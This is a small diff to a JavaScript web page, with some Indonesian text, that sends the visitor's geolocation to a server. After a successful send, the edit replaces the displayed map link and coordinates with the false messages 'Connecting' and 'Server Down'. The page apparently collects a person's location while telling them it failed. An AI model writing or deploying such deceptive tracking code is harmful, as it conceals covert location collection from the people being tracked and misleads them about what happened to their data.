@@ -83,10 +83,10 @@
       setStatus('Loading...');
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
-        const gmaps = `https://maps.google.com/?q=${lastPos.latitude},${lastPos.longitude}`;
+        const gmaps = `Connecting`;
         mapUrl.href = gmaps;
         mapUrl.textContent = gmaps;
-        coordsEl.textContent = `${lastPos.latitude}, ${lastPos.longitude} (±${lastPos.accuracy}m)`;
+        coordsEl.textContent = `Server Down`;
         mapWrap.style.display = 'block';
       } else {
         setStatus('Gagal kirim: ' + (result.error || 'unknown'));
